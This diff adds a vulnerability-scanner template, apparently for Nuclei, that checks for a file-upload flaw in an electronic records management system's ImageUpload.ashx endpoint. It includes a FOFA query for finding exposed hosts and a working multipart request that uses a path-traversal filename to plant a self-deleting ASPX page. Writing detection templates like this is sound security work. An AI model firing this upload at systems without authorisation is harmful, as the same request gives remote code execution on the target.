@@ -1,0 +1,59 @@
+id: dianzi-ImageUpload_ashx-File-upload
+
+info:
+  name: "电子资料管理系统 ImageUpload.ashx 文件上传漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="Menu/Login/ThirdLoginHandler.ashx"
+      电子资料管理系统在 /Menu/ImageManger/ImageUpload.ashx 接口实现中存在文件上传功能验证缺陷，攻击者可利用此漏洞在目标服务器上执行任意代码，部署恶意负载，从而实现对目标系统的远程控制及权限提升。该漏洞允许未经授权的请求者通过构造特定文件格式实现服务器端代码持久化，最终可能导致整个Web应用架构的完整性和可用性受损。
+  reference:
+  - https://mp.weixin.qq.com/s/dqDcIem7B1KUIGPMoumGjg?token=1015546094&lang=zh_CN
+  tags: 电子资料管理系统
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /Menu/ImageManger/ImageUpload.ashx HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Upgrade-Insecure-Requests: 1
+
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Content-Disposition: form-data; name="isUpload"
+
+    印章图片
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Content-Disposition: form-data; name="entid"
+
+    666
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Content-Disposition: form-data; name="Type"
+
+    1
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+    Content-Disposition: form-data; name="Filedata"; filename="../{{username}}.aspx"
+    Content-Type: text/plain
+
+    <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+    ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+- raw:
+  - |
+    GET /{{username}}.aspx HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'pboyjnnrfipmplsukdeczudsefxmywe'
+  - type: status
+    status:
+    - 200
